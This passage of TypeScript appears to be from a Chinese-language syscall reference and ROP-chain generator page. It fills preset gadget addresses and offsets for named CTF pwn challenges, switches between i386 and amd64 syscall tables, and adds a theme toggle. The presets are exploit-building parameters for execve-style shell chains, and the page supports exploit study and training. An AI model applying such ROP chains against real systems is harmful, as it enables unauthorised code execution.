  ropSetTpl("41"); toast("已填入 4.1 示例参数（cmcc_simplerop；示例地址未验证）");
});
$("ropPreset42").addEventListener("click",function(){
  ropSet("ropOffset","56"); ropSet("rop42Binsh","0x080eb050"); ropSet("rop42PopEax","0x080b91e6"); ropSet("rop42Pop3","0x0806fc30"); ropSet("rop42Mov","0x080557ab"); ropSet("rop42Int80","0x0806d7e5");
  ropSetTpl("42"); toast("已填入 4.2 示例参数（get_started_3dsctf_2016；地址由用户提供、未验证）");
});
$("ropPreset43").addEventListener("click",function(){
  ropSet("ropOffset","0x20"); ropSet("rop43PopRax","0"); ropSet("rop43PopRdi","0"); ropSet("rop43PopRsi","0"); ropSet("rop43PopRdx","0"); ropSet("rop43Syscall","0"); ropSet("rop43Binsh","0");
  ropSetTpl("43"); toast("4.3 已清成 0 骨架，按目标重测后填");
});
$("ropPreset41a").addEventListener("click",function(){
  ropSet("ropOffset","0x20"); ropSet("rop41aPopRax","0"); ropSet("rop41aPopRdi","0"); ropSet("rop41aPopRsi","0"); ropSet("rop41aPopRdx","0"); ropSet("rop41aSyscall","0"); ropSet("rop41aBss","0"); ropSet("rop41aLen","0x100");
  ropSetTpl("41a"); toast("4.1a 已清成 0 骨架，按目标重测后填");
});
$("ropPreset42a").addEventListener("click",function(){
  ropSet("ropOffset","56"); ropSet("rop42aBinsh","0"); ropSet("rop42aPopRax","0"); ropSet("rop42aPopRdi","0"); ropSet("rop42aMov","0"); ropSet("rop42aPopRsi","0"); ropSet("rop42aPopRdx","0"); ropSet("rop42aSyscall","0");
  ropSetTpl("42a"); toast("4.2a 已清成 0 骨架，按目标重测后填");
});
$("ropCopyBtn").addEventListener("click",function(){ copyText($("ropCode").textContent,"已复制 ROP 链代码"); });
ropGen();

// ===== 架构切换 =====
function setArch(a: Architecture){
  if(arch===a) return;
  arch=a;
  $("strLabel").textContent=archText("文件名字符串（生成时自动 pushstr 压栈，文件名参数传 'rsp'）");
  $("strLabel2").textContent=archText("第二个文件名字符串（新名字：先 pushstr 再 mov r13, rsp 保存，第二个文件名参数传 'r13'）");
  SYS = (a==="i386") ? SYS32 : SYS64;
  REGS = (a==="i386") ? REGS32 : REGS64;
  $("archAmd").classList.toggle("on", a==="amd64");
  $("archI386").classList.toggle("on", a==="i386");
  document.querySelectorAll<HTMLElement>(".cgArch").forEach(function(el){el.textContent=a;});
  if(a==="i386"){
    $("subLine").innerHTML="<code>eax = NR</code> · ebx / ecx / edx / esi / edi / ebp";
    $("tableNote").textContent="i386 表共 "+SYS32.length+" 条：NR 0\u2013386 段收录现代常用号，31 个历史号未收录（19 个无实现、12 个旧 ABI：oldstat/oldfstat/signal/sgetmask/ssetmask/uselib 等）（含 socketcall=102、ipc=117、select=142、poll=168、mmap2=192、truncate64/sendfile64、set_thread_area=243、359\u2013373 的 socket 独立调用、393\u2013402 的 SysV IPC 独立调用、403–423 的 time64 系列（32 位专用，如 clock_gettime64/futex_time64，415 除外），222、223、251、285、387–392、415 是未分配空号（共 11 个）；149 _sysctl、253 lookup_dcookie 有名无实现、调用只会返回 -ENOSYS，也未收录），NR 424 起为与 x64 共用的新调用、参数签名按同名 x64 调用复用，这一段使用前建议再用 man 确认。找不到就换英文名再试；切回 amd64 看完整表。";
    var n32=$("i386Note"); if(n32){ n32.innerHTML="<b>i386 已核对的易错点：</b>① socketcall(102) 是多路复用入口，子调用号 SYS_SOCKET=1 / BIND=2 / CONNECT=3 / LISTEN=4 / ACCEPT=5，第二个参数是指向参数数组的指针；新内核（4.3+）另有独立的 socket(359)/bind(361)/connect(362) 等号，可直接搜名字。② mmap2(192) 的最后一个参数 pgoff 单位是<b>页</b>（0x1000 字节），不是字节。③ ipc(117) 是 SysV IPC 多路复用入口（semget/msgget/shmget 走它），新内核也有独立号 393\u2013402。④ clone 的参数顺序和 amd64 不同：i386 是 flags / newsp / parent_tidptr / <b>tls / child_tidptr</b>（tls 第 4、child_tidptr 第 5，后两个和 amd64 反着——amd64 是 child_tidptr 第 4、tls 第 5），本页已按 i386 顺序收录。⑤ 同名 uid/gid 调用按名查找返回的是 *32 版号：getuid=199、getgid=200、geteuid=201、getegid=202、setuid=213、setgid=214（旧 16 位版号已从表里去掉，免得搜 getuid 跳出 24）。其余 i386 专属号（0\u2013386）已按 i386 表逐条核对，424 起共用号见上方说明。⑥ 403–423 是 32 位专用的 time64 系列（415 除外）（解决 2038 年问题的 64 位时间版）：参数顺序和同名普通版一样，只是时间结构体是 64 位的，搜 clock_gettime64 / futex_time64 / utimensat_time64 能直接找到；222、223、251、285、387–392、415 是未分配空号（共 11 个），没有对应调用。"; n32.classList.add("show"); }
  }else{
    $("subLine").innerHTML="<code>rax = NR</code> · rdi / rsi / rdx / r10 / r8 / r9";
    $("tableNote").textContent="已按 x86-64 调用号表（syscall_64.tbl）复核：205 set_thread_area、211 get_thread_area、212 lookup_dcookie 在 amd64 上没有实现，调用只会返回 -ENOSYS，已从表中去掉（i386 上 205/211/212 是 getgroups32/getresgid32/chown32 等真实调用，243/244 才是 set/get_thread_area，不受影响）。没收录的号分两类：①未分配空号只有 337–423（共 87 个）；②有名无实现、调用只会返回 -ENOSYS 的 17 个：134 uselib、156 _sysctl、174 create_module、177 get_kernel_syms、178 query_module、180 nfsservctl、181 getpmsg、182 putpmsg、183 afs_syscall、184 tuxcall、185 security、205 set_thread_area、211 get_thread_area、212 lookup_dcookie、214 epoll_ctl_old、215 epoll_wait_old、236 vserver。注意 175=init_module、176=delete_module、179=quotactl 是真实可用的调用，335=uretprobe、336=uprobe 也是真实存在的新调用，都不是空号。找不到就换英文名再试。";
    var n64=$("i386Note"); if(n64){ n64.classList.remove("show"); n64.innerHTML=""; }
  }
  chain=[]; renderChain();
  refreshWlButtons();
  var keep = cur ? cur.name : "write";
  var s = SYS.find(function(x){return x.name===keep;}) || SYS.find(function(x){return x.name==="write";});
  if(s) select(s);
  parseWL();
  toast(a==="i386" ? "已切到 i386（int 0x80）" : "已切到 amd64（syscall）");
}
$("archAmd").addEventListener("click",function(){setArch("amd64");});
$("archI386").addEventListener("click",function(){setArch("i386");});


// A local display preference; generation does not depend on storage availability.
(function initTheme(){
  if (typeof window === "undefined" || !document.documentElement) return;
  const root = document.documentElement;
  const button = $("themeToggle");
  const media = window.matchMedia("(prefers-color-scheme: dark)");
  let chosen: string | null = null;
  try { chosen = window.localStorage.getItem("syscall-theme"); } catch {}
  const apply = (dark: boolean) => {
    root.dataset.theme = dark ? "dark" : "light";
    button.textContent = dark ? "浅色" : "深色";
    button.setAttribute("aria-label", dark ? "切换到浅色模式" : "切换到深色模式");
    button.setAttribute("aria-pressed", String(dark));
  };
  apply(chosen === "dark" || (chosen !== "light" && media.matches));
  media.addEventListener("change", event => {
    if (chosen !== "dark" && chosen !== "light") apply(event.matches);
  });
  button.addEventListener("click", () => {
    chosen = root.dataset.theme === "dark" ? "light" : "dark";
    apply(chosen === "dark");
    try { window.localStorage.setItem("syscall-theme", chosen); } catch {}
  });
})();

initExpWorkbench();

// 默认选中 write
selectByName("write");
